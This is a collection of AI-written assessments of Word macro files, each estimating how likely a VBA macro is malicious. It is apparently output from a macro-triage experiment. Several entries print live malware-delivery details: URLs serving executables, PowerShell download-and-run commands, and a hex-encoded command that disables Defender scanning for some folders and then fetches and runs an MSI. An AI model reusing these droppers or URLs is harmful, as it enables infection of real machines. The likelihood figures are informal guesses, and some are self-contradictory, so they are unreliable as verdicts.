GPT's analysis:
After analyzing the given VBA code, it appears to be potentially malicious for the following reasons:

1. The script creation and interaction with Objects out of UserForm's ComboBox. 

2. The script tries to open files using user input (FileName:=UserForm2.ComboBox1, Password:=UserForm1.ComboBox2), which is a red flag, as it may lead to arbitrary file access if misused.

3. There are references to turning off Application.DisplayAlerts which can prevent the user from knowing unwanted modifications or actions in the Office documents.

4. The script is dynamically creating other objects from the value of ComboBoxes, which can be Programmatic identifiers of unwanted libraries or services.

5. Multiple 'On Error Resume Next' statements which are used to suppress errors and evade detection.

6. The script utilizes the 'CallByName' function extensively. This function can execute arbitrary methods on an object, potentially allowing dangerous operations.

As an IT Security analyst, I'd estimate that there's a 90% likelihood of this being a malicious code. However, without further information or context about the environment where the code is used, this is based on the potential threats identified and doesn't necessarily mean it has been used maliciously. It is suggested to review the code thoroughly with the software owner or developer before permitting its execution, especially in a production or sensitive data environment.

GPT's analysis:
Based on the analysis of the given VBA code, it is quite clear that the code is doing conversion with the base64 strings and subsequently trying to execute command using the shell command which is a common pattern in many kinds of malware. 

The functions `dsadaqwdqd` , `HLUZHHuhlWMJItEwDCRWGWObTGRLPIDEwAbElelaxpbMEAmTIRMORpP` and `fwqfqwads` decode these strings and convert them into executable shell command. Thepresence of the `Shell` command without any form of input validation or restrictions is quite concerning as it means that the program can run an arbitrary command on the system.

Providing a percentage estimation of the likelihood of this being malicious is challenging as it depends on the context and target system information which is not available. However, due to the suspicious patterns and high risk behaviors in the code, I would put the possibility at around 85-90%. 

It is also advisable to do an in-depth behavioral analysis by executing this code in a controlled environment, such as a sandbox, to understand its intentions better. 

Note that executing, testing, or investigating such code should be left to trained cybersecurity or IT professionals and should always be conducted in a secure and controlled manner.

GPT's analysis:
The code seems to be mostly harmless, but it does contain a few elements of uncertain nature that could potentially be harmful. For example, it uses several long, randomly named functions, possibly to obfuscate its activity. Additionally, it uses CreateObject("Scripting.Dictionary"), which could potentially be used as a way to manipulate or interfere with programs or data on the computer. 

Moreover, it is manipulating "ActiveDocument.CustomXMLParts", which could be a potential way to embed malicious payloads, and constructs an executable string with various functions, indicating that it possibly drops a file on the disk and potentially executes it.

Also, it checks for files before proceeding to further execution which could be a way to bypass detection. 

However, the real detail of exact payload or the ultimate goal of the code can't be identified from this. It involves some form of obfuscation and a potential for suspicious activity but what it might do exactly isn't apparent from the code provided.

Estimated likelihood of potentially malicious: 70%
================================================================================

GPT's analysis:
After analyzing the provided VBA code, several suspicious actions raise concerns.

1. The function "CsujDdVBeIgnAOqxtiKLwyhcqMBObTffaFDNWsSWPNwDBFrvfKJmQfn" seems to be a string decoding function that subtracts 33 from the ASCII value of characters in the string. This could be utilized to obfuscate content or commands from basic analysis or detection tools.

2. The "Shell" command which is used to execute system commands is called twice. This can be a typical sign of malicious behavior as it might be executing concealed or encoded commands, potentially allowing the attacker to manipulate the system.

3. The obfuscated strings likely resolve to real system commands or file locations once passed through the obfuscation function "CsujDdVBeIgnAOqxtiKLwyhcqMBObTffaFDNWsSWPNwDBFrvfKJmQfn".

4. Furthermore, there's an interaction with an "Excel.Application" object, adding an enforcement delay before the "Shell" command gets executed - this could be an evasion technique to avoid sandbox detection.

Taking all these points into account, the likelihood that this code is malicious is very high. Without more definitive proof such as seeing the resolved command strings, I would give an estimate of 85-90% that this is intended to be malicious code. Further deep dive analysis or dynamic execution might provide additional insights.
================================================================================

File: 125.docm
GPT's analysis:
The code provided uses VBA (Visual Basic for Applications) which is typically embedded in Microsoft Office documents and other applications to automate tasks. It does show signs of being potentially harmful and is likely to contain malware. Here's why:

1. Use of CreateObject("Excel.Application") can be used to create or manipulate Excel objects, but in this instance, it's used in conjunction with Wait and Now + TimeValue functions, delaying the execution of a sequence. The delay in execution is a common tactic used by malicious codes to avoid detection by security software scanning the document on open.

2. The code uses the Shell function, which is typically used to run a program or command in a new process. It's a common method used by several malware to execute a malicious executable or command.

3. A function GlPdXtSqeTUQWihCsmJXOWHHUJisaImMaaijeGxUMZokRPxsALJLQQh is defined which does an operation on the ASCII values of the input. This looks like it is decoding a scrambled or encrypted string, which is a technique often used by malware to avoid detection.

4. The use of Environ which retrieves the system environment values could be used to manipulate or get sensitive information.

5. It uses gibberish looking names for the function and variables, which is another common obfuscation technique among malware authors.

Chances of this being a malicious code: 95%. It's advisable to run it in a controlled environment to further understand its complete functionality. Further analysis should include decoding the strings passed to the custom function.

GPT's analysis:
Upon analyzing the VBA code provided, it appears to be a macro script that is designed to convert a Word document into a PDF file. The script basically extracts the active Word document's name, drops the file extension, and then appends '.pdf' to it. Then it saves the new PDF to the path "C:\documents".

Inspecting the code, there are no signs of malicious actions, such as data exfiltration, suspicious network communications, or file operations that could potentially modify important system files. There are also no signs of common obfuscation techniques that are often used by malware authors to hide their malicious intent.

From the presented code, we can estimate a 0% likelihood of it being a malicious script. However, in practice, it would be prudent to have the entire macro's codebase reviewed by an experienced analyst, as macros can often include numerous separate modules and this sample may not be representative of the entire macro. Also keep in mind that human error may play a part in security vulnerabilities, as evidenced by the misspelled documents folder in the script. 

Lastly, while the code appears benign, it's important to always be cautious when dealing with macros as they are a common vector for malware distribution. Even seemingly harmless macros can be used in more elaborate attacks as a stage one component. Therefore, executing macros should be limited to trusted documents.
================================================================================

File: 142.docm
GPT's analysis:
The VBA code provided appears to be highly malicious, assigning it a likelihood of 100%.

Upon a closer look at the code, we see that during the document opening, it creates an instance of the Wscript shell object and uses hexadecimal values to convert to ASCII and form a string ("WScript.Shell"), which is a common method to launch a shell script or execute commands.

Then it forms a string for a PowerShell command to download a file from a given URL, save it to a temporary local directory, and then execute it.

This approach is commonly used as a first-stage payload in a multiple-stage infection process, where the initially downloaded payload is relatively small and may download additional and potentially larger payloads based on instructions received from the controlling server after the initial infection has succeeded.

The PowerShell script bypasses the execution policy, runs hidden, downloads an executable file from an external URL (http://www.bradleyandbradley.net/wp-admin/nFTaxyszxe9jAv.exe), and finally executes this file.

While the obfuscated function name and variables make it harder for a human observer to understand what's happening, the actions it performs are clearly malicious in intent. Examples of such harmful actions include running a power-shell without displaying it to the user, bypassing policy settings, executing an externally sourced file, and potentially infecting the system with malware.

It's important to note that even though we're certain this script is malicious, different defense systems or antivirus software may or may not catch this depending on their capabilities.
================================================================================

File: 136.docm
GPT's analysis:
This VBA code does not seem to relate directly to common malicious activities such as downloading files, executing harmful programs, or stealing information. However, the script uses methods that are often associated with obfuscation, a technique used to conceal its true purpose. 

It creates arrays of numeric values and then uses code to work through these arrays, using XOR encryption and the Chr function to generate some kind of string. This string is then shown in a message box (MsgBox v10).

While this code doesn't seem to have any immediate harmful effects itself, it could easily be adapted to execute more malicious actions, and its obfuscation could be a sign of an attempt to hide such activity. Therefore, based on the obfuscation and potential for adaptation, it's possible that this could be related to a malicious macro or part of a larger intrusion attempt.

Given that no immediate harmful action is taken, but the potential exists based on the obfuscation, I would classify this macro as 40% likely to be malicious in nature. It's worth noting that further contextual information could raise or lower this estimate, and additional steps should be taken to secure your environment if this code was unexpected or unaccounted for.
================================================================================

File: 116.docm
GPT's analysis:
The VBA code provided is highly suspicious and most likely malicious at an estimated rate of 90-100%.

Here are some reasons why I make this conclusion:

1. The function sadsad decodes a base64 string to text. The base64 string, when converted, translates to Power Shell commands that download a file from hxxp://tinyurl.com/ya7bodfg and saves it as ieaddon.exe in the environment temp directory and then executes the file.

2. The function jUMyBruSjvRJkbhlQOyOycbkplIEsMTAQpXarcNEzdwMGFiMSwvMJeM processes the byte array to be read as a string, indicating it deals with the data downloaded.

3. The code is set to run upon document opening, so the potentially malicious activities happen immediately when the document is opened.

4. The base64 encoded string in the code is containing PowerShell commands to be executed. These commands bypass execution policy, download and run an executable file. This behavior is commonly associated with malware delivering trojans or ransomware.

5. VBScript Shell object is used to run the decoded base64 string (PowerShell commands) silently (2nd parameter set to 0), which is very typical for a malicious activity.

Based on these findings, this script appears to be part of a malware delivery method commonly used in phishing and targeted attacks. This type of script is often embedded in macro-enabled office files, which are delivered via email attachments or links.
================================================================================

File: PP.docm
GPT's analysis:
After analyzing the provided VBA code, I can conclude that there are no harmful actions being performed here. The VBA code simply takes the current document (the "active document"), gets the current date and time, forms a timestamp from this, appends the timestamp to the filename of the document, and saves a new copy of the document with this new filename.

Therefore, the likelihood of this code being malicious is estimated to be 0%. However, this estimation is specific to this individual code snippet and the context it's being used, and it could change in different contexts or with extra code that is not displayed here. We could also say that while the direct actions in this code are not harmful, embedding macros in Office documents is often used in phishing or malicious attacks, so the very presence of a macro could be a red flag to a security system or vigilant user.
================================================================================

File: 92.docm
GPT's analysis:
The given Visual Basic for Applications (VBA) code shows signs of malicious behavior. Key points of concern include:

1. It attempts to check for the existence of a ".gattaka" file when the document is opened. If it exists, it displays a message box saying "Obsolete environment, please, update". It seems to be taking actions based on the presence of this file (possible a flag or marker for other malicious activities).

2. It contains methods related to the handling of byte arrays, seemingly converting and encoding them. This raises a warning as this is frequently seen in malware for disguising harmful payloads.

3. It contains methods that use the Randomize function and Rnd function, with seems to be intended to generate random file names or content, a common tactic used in malware to avoid detection.

4. It tries to modify ActiveDocument.CustomXMLParts, a function often exploited in macro-based malware to save and execute malicious payloads.

5. It uses the GetObject function to create or access COM objects, which could be used to create a malicious process or perform other harmful actions on the system.

6. Last but not least, it attempts to create a new instance of a system object and execute it (SpawnInstance_ method which is mostly used in instances of spawning new processes in WMI). This could potentially be used to start a malicious process.

In conclusion, considering these behaviors, there is a high likelihood (around 90%) that this VBA code is malicious. It doesn't seem to serve any legitimate purpose, instead, it uses techniques frequently associated with malware. Therefore, extreme caution should be exercised with this code and such files should not be run on a system without proper isolation and safety measures. 

Remember, these assessments are based on the provided script and the actual impact could vary based on how and where this script is being executed. It's always recommended to consult with an IT security specialist for a comprehensive risk assessment.
================================================================================

File: 138.docm
GPT's analysis:
The code provided is highly suspicious and quite possibly malicious. This VBA (Visual Basic for Applications) macro has code that automatically runs when a document is opened (via the 'AutoOpen' method), and it downloads and executes a .exe file from a specified URL.

The Macro downloads 'signed_20240315045910405.exe' from the IP address 'https://107.175.3.10/Users/' and saves it to 'C:\ProgramData\'. After the file is downloaded and saved, it's then immediately executed.

The act of any script or Macro downloading and executing files from the internet, especially without any user intervention, is inherently suspicious and risky. This behaviour is often associated with malware delivery and execution.

The hostility of this macro can't be guaranteed without more context, such as: 
- Knowing the purpose and the source of this document.
- The intention behind having such a script.
- Analysis of the 'signed_20240315045910405.exe' file for potential harmful behavior.

However, given the lack of context, we can subjectively say that the likelihood of this code being malicious could be as high as 95%, considering that the 'AutoOpen' subroutine is commonly used in malicious office macros for various forms of attacks and exploits. Furthermore, the explicit use of IP address instead of a recognizable URL and downloading an .exe file is highly suspicious. Security mechanisms should be in place to prevent such actions without user consent.
================================================================================

File: 66.docm
GPT's analysis:
Analyzing the VBA macro code provided it does appear to contain characteristics which are often associated with malicious activity. Some of these suspicious functionalities include:

1. It uses a custom data encoding method using its own dictionary to convert numbers into characters.
2. It writes data into a binary file; this data is fetched potentially from the custom XML parts of the open document.
3. It then executes a shell command to run this binary file.
4. It searches for a '.gitingore' file and if it finds it, doesn't execute the potential payload (likely utilized as a sandbox evasion technique).

The use of seemingly random numbers throughout the code ("137171", "166157191179213210202213196208167196215196191219219219145199207207", "213216209199207207150149131", "143134148"), based on the functions used in the script, likely represent obfuscated commands or data.

All this obfuscation, execution of shell command, and sandbox evasion represent behaviour which is very often related to malicious VBA macros used to deliver some sort of payload, possibly in the form of malware or a trojan.

Given these factors, there is a high probability that this VBA code is malicious. I would estimate it to be 90-95% likely to be malicious, but for a conclusive verdict a more detailed analysis or execution in isolated testing environment is recommended.
================================================================================

File: 63.docm
GPT's analysis:
This VBA code contains several signs of being potentially malicious:

1. The usage of obfuscated function and variable names, which is used to make it harder for an analyst to understand what the code does.

2. The presence of a Document_Open() subroutine suggests the code runs automatically when the document is opened, a common tactic used in malicious macros.

3. There are functions for writing binary data to a file (raeozmfjnymq, tylkftcicrjxfvkh) and obfuscating strings (rrhzspxkphvvy, siudlfagynaqsgxowx) which can be used in evade detection and deliver payloads.

4. The code checks for a ".gattaka" file upon execution. If found, it gives an error message "Not applicable environment", which could suggest some ability to adapt depending on the environment (another common tactic in malicious macros).

5. The manipulation of the ActiveDocument.CustomXMLParts and GetObject functions suggest that this macro is attempting to access or modify system level objects or written external files.

6. The program attempts to create an instance of a service and spawn it as a separate process which is a common way malware tries to persist in the system.

In conclusion, considering the abovementioned facts, I would rate this VBA code as 85% likely to be malicious. The code does potentially harmful operations that are not common for regular VBA macros within Microsoft Office documents. However, some parts of the code do nothing harmful directly which can confuse an analyst. 

Remember: Always avoid enabling macros in documents from unknown sources since this is a common vector for malware delivery.
================================================================================

File: 110.docm
GPT's analysis:
As an IT security analyst, this VBA code appears to be conducting suspicious activities which can be harmful.

Analyzed Points:

1. The Macro features a "Private Sub Document_Open()" which triggers automatically when a document is opened. The embedded code can be harmful and potentially exploit certain functionalities of the software.

2. The VBA code makes use of certain functions which are possibly trying to hide or cloak their activities from any code analysis tools. Functions like "tylkftcicrjxfvkh()" and "siudlfagynaqsgxowx()" appear to be executed in a convoluted manner.

3. The Code is using the functions to create an array of bytes, which might be an encrypted payload concealed in the code. This indicates that the code has potential for harmful action.

4. Checking and reading files with the ".gattaka" extension. The intention behind this is not clear.

5. The code seems to be creating a new instance of an object with CreateObject("Scripting.Dictionary"), and using it in a manipulative way. The 'GetObject' function is also invoked to potentially interact with a system object which can be concerning.

6. The Sub "zwxcnxajcshyp" indicates that it is going to create a file and then execute it. This can be harmful especially if the file contents are malware.

7. There are several strings which appear to be obfuscated or encrypted. These could contain hidden malicious instructions.

Given the above activities, the potential for this code to be malicious is high. However, a definitive judgement may need dynamic analysis in a controlled environment. I would estimate an 85% likelihood for this code to be malicious based on the static code analysis.
================================================================================

File: 24.docm
GPT's analysis:
Analyzing the VBA script indicates possible harmful actions. The script appears to execute commands using the Windows PowerShell through the 'WScript.Shell' object. It also seems to include hex strings which are converted back to ASCII characters using the function 'VREiUSgJoSajCSvxeFyUzLGBfBFdRsZaQKtLFUgtFaWPjUObQUKFPAk'.

Decoding those hex strings reveals the script tries to download a file from a web address (http://4nulleddco.com/hRUNa8ehujzfrYl.exe) and save it to the temp folder under the name 'ZAroot.exe'. Afterwards, it will execute this downloaded file. 

This kind of behavior is very typical for malware scripts, especially trojans or droppers, as they usually download and execute a malicious file from the internet.

Based on the aforementioned analyze, it is highly likely (around 90% - 100%) that this Visual Basic for Applications (VBA) macro script is malicious and its purpose is to download and execute malware in the system. 

Note that the aforementioned percentage is an estimate and depends on the context in which this script is being used, as well as the relevance and execution of the stored URLs or peripherals. Always ensure to have an updated Anti-Virus software to detect and protect your system against such threats.
================================================================================

File: 20.docm
GPT's analysis:
The VBA code has a high likelihood of being malicious, probably close to 100%.

1. There is a function `ISoGmispjgHExCjIKJQEOKmWPGQxKPYjGsRFHqDzMxWoCcnwjJyPzrs` that reconstructs ASCII hexadecimal code into a String. The hexadecimal code is likely to be obfuscated to make detection by anti-malware tools more difficult.
   
2. In the `Document_Open` method, an object `ohrAmUBCGJReCSfGVpgPskZCMGgUFZcMOBWzjtmnNJmhElmOgqANcXD` is created and is assigned a value that potentially includes instructions to download a file from a particular URL, named 'www.nesilgroup.com.tr/wp-content/Ovbm.exe'. The file is downloaded to a temporary folder and named 'Yoor.exe'. 
    
3. Following this, the Shell function is called to execute the downloaded file, suggesting that the file downloaded may be an executable (.exe) file, typically programs that can perform actions on your system.
    
These indicators strongly suggest a malicious behavior, such as downloading, installing, and running potentially dangerous programs on the victim's computer system. It is advised to never open documents from untrusted sources and to always have up-to-date antivirus software.
================================================================================

File: 127.docm
GPT's analysis:
The code contains an autoopen VBA macro which is usually a sign of a potential malicious document as it can be used to execute code upon document opening. The macro includes methods to create instances of objects and send data using the CreateObject and Send methods.

There are some parts of the code (for example, husbanDip, Crentips function in Module3) which are catching errors and continuing with execution rather than halting. Therefore, if something goes wrong, you may not notice. 

Interactive functions (like Debug.Print) may also be a cause for concern as they could be reporting back information to a potential attacker. 

Additionally, it is noticed that the fishkinet objects are publicly defined but aren't explicitly declared in any portion of this provided code. If these objects are related to external or potentially harmful methods/sources in parts of the code that aren't shown, it cannot be ruled out that it could contain harmful actions. 

Given these facts and from analysis of the code, though no explicit malicious actions are seen directly, it has a 60% likelihood of being potentially malicious due to the nature of auto-open commands, complexity and suspicious handling of objects and values. 

Please note, this percentage is an estimation and further analysis would be needed to come to a more accurate conclusion. It is highly recommended to avoid running macros from unknown or unreliable sources.
================================================================================

File: 89.docm
GPT's analysis:
The given VBA code has several potential harmful actions indicating that this code might be malicious:

1. The function SwitchSides appears to be doing some kind of encoding. It's converting a string (probably hex number) to a byte array after doing some calculations based on a hard-coded string (probably some kind of key to obfuscate data).

2. The HealthCheck function is writing data to a binary file without any user consent, further indication of covert activities. Moreover, it shows a vague and alarming error message "Abnormal termination" whenever the optional parameter is set to True.

3. The dc function seems to be a decryption routine taking a number string and seemingly decrypting information based on a formula. The prep_dc function is used in this process, creating a scripting dictionary key to be used in decryption.

4. The Initialize function checks for a file ".gitingore" (intentionally misspelled .gitignore?), which could be a cloaked action. Furthermore, it runs a Shell command (dc("213216209199207207150149131") + dc(out_fqn) + dc("143134148")) which strongly suggests remote command execution.

Overall, the code involves obfuscation, encoding/decoding, writing to file without user consent, potentially remote command execution and some sort of hiding activity - these are clear indications of potentially harmful or malicious behavior, most likely, a Trojan horse or a backdoor.

I would say there is a 90% chance this VBA code is malicious. An exact determination would need more context and possibly dynamic analysis but based on this static analysis, it is quite likely the code is harmful.
================================================================================

File: 81.docm
GPT's analysis:
After analyzing the above VBA code, I can confirm that it is highly likely to be malicious. 

Here's why:

1. The code is obfuscated with base 16 encoded hexadecimal strings. This is a common technique used by attackers to hide their malicious intent to evade antivirus programs.

2. The purpose of the function mZQTPZkhVuogqJzacUafLPNHjwBaVGrcSSGERyQTSSVPNhMHfOKzGQl() is to convert hexadecimal strings into ASCII strings.

3. The Document_Open() subroutine is automatically executed when the document is opened. In this routine, the decoded hexadecimal strings point to a series of actions. First, it uses .NET's WebClient (System.Net.WebClient) to download a file from a specified URL, http://eurostudiescy.com/putttttty/PurchaseOrder.xlsx.exe. Then, it saves the file in the Temp directory as Filename21.exe.
   
4. The next part of the code, Shell(), is used to execute the downloaded file. Therefore, any user opening the document will unknowingly download and run a potentially malicious executable if they allow macros to run.

Given these facts, I would assess the probability of this VBA script being malicious as 100%. If this is found in an enterprise environment, it should be treated as a security incident.
================================================================================

File: 97.docm
GPT's analysis:
The VBA macro provided here is malicious and I'd rate it as a 100% probability of being harmful. Here's why:

1. The `AutoOpen()` function automatically executes when the document is opened. This is a common strategy used by malicious macros.

2. The AutoOpen function is looking for a base64 encoded string in the "Comments" of the document properties. This likely means that the attacker is storing their malicious payload within the comments property of the document. 

3. The macro then decodes this base64 string using `Base64Decode` function and stores it in `orig_val`.

4. In the case of a Windows operating system, the `ExecuteForWindows` function then writes this decoded value (likely an executable code) into a new random .exe file in the temporary directory by creating an instance of the `Scripting.FileSystemObject` and `WScript.Shell` COM objects which are often used by malicious scripts for automation and creating/executing files.

5. It then runs this .exe file. This could lead to harmful actions like installing ransomware or other malware, stealing sensitive information, etc.

6. In the case of macOS `System` function is used to execute the python script from the decoded value.

This macro has all signs of being a delivery vehicle for malware. Be careful opening documents like these.

GPT's analysis:
The given VBA code appears to be malicious with a high likelihood of about 100%. Upon analyzing the provided code and its functions, the following suspicious activities can be identified:

1. There is an attempt to run unknown commands using the "WScript.Shell" object, which is often used in scripts for automating the Windows GUI and general scripting. However, in malicious scripts, it can be used to run commands that are harmful to the system.

2. The code appears to write and later delete a registry key. Malware commonly uses registry keys to maintain persistence on a system or to store links to downloaded malware payloads.

3. Furthermore, the code appears to be obfuscating activity. Strings like `"484B43555C456E7669726F6E6D656E745C77696E646972"` and `"636D64202F6320737461727420705E6F77657273685E656C5E6C202D772031204164642D4D70507265666572656E6365202D4578636C7573696F6E506174682024656E763A74656D70203B4164642D4D70507265666572656E6365202D4578636C7573696F6E506174682024656E763A61707064617461203B53746172742D536C6565702031323B20284E65772D4F626A656374204E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F3130382E36322E3131382E31372F457237485F626336472E6D7369272C2824656E763A61707064617461292B275C4A6159534E2E6D736927293B53746172742D536C65657020323B2053746172742D50726F636573732024656E763A617070646174615C4A6159534E2E6D73693B2652454D"` appear to be hex-encoded to obscure their true purpose, which is a common tactic in malicious scripts to avoid detection. 

4. One of the obfuscated strings appears to contain a URL (http://108.62.118.17/Er7H_bc6G.msi), indicating that this script may be designed to download and install an unknown .msi file. This is a very common technique used by malware to infect systems.

5. Finally, the code seems to use a sleep function to delay suspicious activities, another common trick used by malware to avoid detection.

Given all these points, it's highly likely this VBA Macro is malicious. However, without further decryption of the obfuscated strings, a 100% definitive declaration of malice may not be made as some benign programs may utilize similar functionalities (e.g., software updates).

The given VBA code appears to be benign from a security analysis perspective. It does not perform any harmful actions like downloading/executing other files, altering system settings, exfiltrating data, interacting with other systems on the network, or harvesting sensitive information. 

The code simply monitors a bookmark in a Word document. If that bookmark's content changes, it updates a barcode object with the new content. The code repeats this action every second using a timer.

Keep in mind that while there is no malicious activity present in this specific code, it doesn't mean the overall document or application cannot be used maliciously. For instance, if a malicious actor manipulated the bookmark content, the barcode created might lead to a harmful website or resource. 

However, based strictly on this script, the probability of it being used maliciously is very low, around 5%. But it is always a good idea to thoroughly analyze other parts of the application and the sources from where data is imported in the application as well.

GPT's analysis:
Upon analyzing the VBA (Visual Basic for Applications) macro code provided, it shows signs of being potentially malicious:

1. Use of the `Shell` function in VBA: This function allows the coder to call an executable, which can be potentially harmful. It opens the possibility of executing command line arguments or launching any arbitrary command that the developer desires. In this case, the executable being run is encrypted using a consistent offset value (-73), which is an obfuscation technique often used to avoid detection. Adding to this, the name of the executable or the command that's being run is not readily visible, making the action of the macro less transparent.

2. Obfuscation, Indirect References and Encoding: The function MCrfbwZAQkPxExEJCsGZZsfMEWLxoRIJCLEQUTcyjnKoE is decoding a string which appears to be in Hexadecimal format. The fact that the function is performing hexadecimal transformations using offset and being added through concatenation to then be executed in shell suggests that the macro may be used to run potentially harmful commands. 

3. Execution Upon Document Open: The "Document_Open()" event means that this code will be executed as soon as the document is opened. This is a common feature of many malicious macros, as they often want to start running as soon as possible, without user intervention.

Chance of being Malicious: The code has several red flags suggesting it is potentially harmful. It is certainly not a definitive assessment without knowing its exact function after decoding. However, based on the present facts, I estimate it to be around 85-90% likely to be malicious. You should not run this code without performing a comprehensive analysis in a secure and isolated environment.

GPT's analysis:
The VBA code provided here doesn't contain any malicious or harmful actions. It's a simple script intended to analyze a Word document and generate a report of the total number of words and sentences, as well as the length of the longest sentence.

The VBA code doesn't contain any operations that modify or delete files, interact with the system outside of the Word document it's working with, or perform any network operations. It also doesn't appear to hide its actions or conceal its purpose.

However, there are cases where malicious activities are disguised in the VBA code under legitimate processes. Hence, security analysts often recommend that you should not run macros or VBA scripts from sources you do not trust, or which you have not reviewed and understood.

In this case, considering the provided VBA code, there is a 0% chance that the code is malicious.
================================================================================

GPT's analysis:
After analyzing the provided VBA code, it can be concluded that it does not engage in any malicious or harmful activity. The code is structurally sound and lacks connections to any external systems, databases, or internet-based resources. Furthermore, the code doesn't modify any system or user files, nor does it manipulate any security-related settings.

In this VBA script, its sole purpose is to filter paragraphs in an active Word document by font color. It checks each paragraph's font color and if it's red, it will keep that paragraph visible. Otherwise, it hides other paragraphs. At the end of the process, a message box appears informing the user that the document has been filtered to show only red-text paragraphs.

Given this analysis, it is safe to say that the potential of this VBA code to be malicious is approximately 0%.

GPT's analysis:
Based on the analysis of the provided VBA (Visual Basic for Applications) code, it does not appear to contain any malicious intent. The code is designed to iterate through the characters in a Microsoft Word document and bold any characters with a font size of 12.

It does not contain any potentially problematic calls such as Shell() or CreateObject(), which could be used to carry out harmful actions. There are also no questionable web connections, file interactions which could potentially be harmful, or risky Registry modifications present in the code.

Application macros can be of security concern, however this script does not seem to have any harmful or suspicious activities. The code only interacts with the document it is contained in, does not move or manipulate any files or perform any actions outside of the Word document environment.

Therefore, for this specific code, I would say the potential for harmful actions is 0%. Nevertheless, any other macros with different code should be thoroughly screened for potential intrusive activities. Remember that this assessment is based only on this macro and should not be taken as a general safe pass for all VBA macros.

GPT's analysis:
Based on the given VBA code, it does not appear to be malicious based on standard practices of malware analysis. The code appears to contain a fair amount of typical programming logic and usage of standard VBA libraries and functions. However, a closer examination reveals some key factors that indicate this may not be harmless:

1. Obscure comments and unused variables add confusion, which is a common trick used in hiding malicious activity.
2. The VBA code contains a function called "UnsafeNativeMethods", which can potentially be used to perform unsafe operations.
3. The "Shell" command is used, which is typically involved in shellcode execution, a common malware technique.
4. The function "UnsafeNativeMethods" seems to be passing a long hexadecimal string and attempts to execute the result of it.

These points are very suspicious and could suggest a potential malware code hidden, but it's hard to confirm due to the obfuscation and the lack of more context. 
Therefore in conclusion, from a standard analysis, this code reads as non-malicious, but with the highlighted suspicious behaviors, there could be a chance of about 60% malicious activity hidden within this code. Exposing this code to sensitive systems without further, more detailed analysis is not recommended. Please consider this percentage as a relative measure; it may vary based on more specific observational criteria.
================================================================================

File: 18.docm
GPT's analysis:
This VBA macro is highly likely to be malicious, with an estimated likelihood near 100%. Here's why:

1. It is using several Windows API Kernel32 library functions with obfuscated names such as AllocStuff (VirtualAllocEx), WriteStuff (WriteProcessMemory), RunStuff (CreateProcessA), and CreateStuff (CreateRemoteThread). These functions allow the macro to allocate memory, write to it, create a process, and create a thread within another process, which are common behaviors seen in malware for process injection or creating a process running malicious code.

2. It contains obfuscated shellcode in the array named myArray. Shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is usually used to create a backdoor, download and execute malicious files, or to directly run a malicious command.

3. The Auto_Open, AutoOpen, and Workbook_Open subs alll call the same function. This likely ensures the macro will run as soon as the document is opened, or when the workbook is opened, often seen in malicious macros. 

4. Lastly, it uses the RunStuff (CreateProcessA) function to run 'rundll32.exe', a legitimate Windows process that's often abused to run malicious code due to its ability to execute DLL files.

Please note, a definite confirmation would require a complete dynamic analysis. However, given these factors, we can infer it's potentially dangerous.
================================================================================

File: 137.docm
GPT's analysis:
The code appears to be a macro script that is set to run when the document is opened. It uses a script to execute Powershell, a powerful scripting tool often used by IT professionals. The Powershell script seems to start the Google Chrome browser and opens a specific URL. 

While Powershell usage itself doesn't mean it's malicious, its use in macros and the automatic calling of a URL are behaviors commonly associated with malicious macros - most likely phishing attempts. 

The URL, "https://mail.mfa.az-link.email" appears to be impersonating a legitimate site due to the "az-link.email" (which might be attempting to look like Azure link). The "/_task=login/" portion of the URL further indicates that this is a possible phishing attempt, potentially seeking to harvest user credentials. 

There's no direct destructive behavior in the script itself such as file deletion or modification - it seems its main purpose is to redirect the user to a page that might be used for phishing attempts or to drop additional malware.

So to evaluate on the potential for harmful actions; while it's deceptive and possibly the first step in an attack (like phishing or further malwares), it's not actively harmful by itself. The script doesn't appear to have any functionality for escalation of privileges, destroying data, or directly stealing sensitive information from the local machine.

Taking all into account, I'd estimate it's 60-70% likely to be part of malicious activity, mainly phishing or as an initial step in a malware dropping process. Please connect to your security department or professionals for further analysis and steps.
================================================================================

File: 93.docm
GPT's analysis:
After analyzing the provided VBA code, it is potentially highly malicious with a likelihood of about 95%.

This judgment is based on several concerning elements of the code:

1. The script includes a function that automatically downloads an executable from a remote server (`https://New-Coder.cc/Users/signed_20240329011751156.exe`) without the user's knowledge or consent.
2. It also automatically saves this downloaded file into `C:\ProgramData` directory.
3. Once downloaded, the script is designed to execute this file quietly. The nature of the executable downloaded is unclear, but given the surreptitious manner it's implemented in, it can be assumed to be harmful.
4. The file does not appear to request any user consent or provide any notifications upon execution, potentially leaving the end user unaware of any changes it is making to their system.

These behaviors are common characteristics of malware such as trojans or worms, which typically try to avoid user detection while performing harmful activities.

Please be aware that the harm could vary depending on the actual payload of the `signed_20240329011751156.exe`. The provided VBA code itself just downloads and runs the file, the malicious activities are carried out by the `signed_20240329011751156.exe`. But that such a script exists -- and intends to download and run an executable without user input -- can be safely considered as an indication of a harmful intention.
================================================================================

File: 50.docm
GPT's analysis:
The provided VBA codes are minimal and do not appear to contain any inherently malicious activities. The first VBA code seems to be basic attributes settings. 

Then in the second VBA code, there is an autoopen() subroutine that displays a message box with the value "1" when the macro is auto-opened. They both don't do anything suspicious like altering files, accessing the web, reading sensitive data, or any other typical harmful activities associated with malicious codes.

However, the use of the "autoopen()" subroutine can be concerning. This is because "autoopen()" is often used in malicious macros as it runs automatically when the word document is opened. This can serve as an avenue to introduce malicious activities, although it doesn't do anything harmful in this current context.

In conclusion, the potential risk of these codes being malicious can be placed at 5%. This is because of the use of the "autoopen()" function which could be exploited in more complex macros, but the available VBA codes do not presently perform any harmful activities. It's always essential to enforce good security practice and open documents or run macros from trusted sources only.
================================================================================

File: 30.docm
GPT's analysis:
The supplied VBA Macro code has several suspicious characteristics that are commonly found in malicious scripts:

1. The use of obscure, non-descriptive function and variable names. This is a common technique used by malicious actors to hinder analysis and hide functionality.

2. The use of Base64 encoding and other encoding/decoding functions (like `rrhzspxkphvvy` and `tylkftcicrjxfvkh`). These can be used to obfuscate malicious payloads.

3. The use of the `GetObject` calls. These can be used to interact with system components or other objects in a potentially dangerous way.

4. The use of `rnd` function and randomizing elements, and arrays with different language codes.

5. The creation and modification of files (using `Open`... `Put`... `Close` statement).

Considering the above points, there is a high potential for malicious activity in this code. Without knowing the context of its usage, the potential maliciousness of the code cannot be accurately quantified. However, to give a raw estimate, the code might have around an 80-90% likelihood of being malicious due to its use of file interactions, obfuscation, random elements, and system object manipulations. 

